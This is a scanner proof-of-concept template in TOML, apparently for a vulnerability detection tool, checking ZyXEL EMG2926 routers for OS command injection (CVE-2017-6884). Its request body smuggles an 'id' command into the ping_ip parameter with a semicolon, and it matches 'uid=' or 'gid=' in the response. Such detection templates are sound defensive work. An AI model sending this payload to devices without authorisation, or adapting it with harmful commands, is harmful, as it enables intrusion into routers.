[info]
author = "ave"
description = "检测 ZyXEL EMG2926 路由器诊断功能中的命令注入漏洞。向 /expert/maintenance/diagnostic/nslookup 的 ping_ip 参数注入系统命令，若响应中包含命令执行结果则存在漏洞。"
id = "POC-AVE-2017-1100"
name = "ZyXEL EMG2926 OS Command Injection PoC"
severity = "high"
tags = ["ave-2017-1100"]
vuln_id = [
    "CVE-2017-6884",
    "AVE-2017-1100",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/expert/maintenance/diagnostic/nslookup"
protocol = "http"

[poc.requests.body]
content = "ping_ip=127.0.0.1%3Bid&pingtype=0"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
]
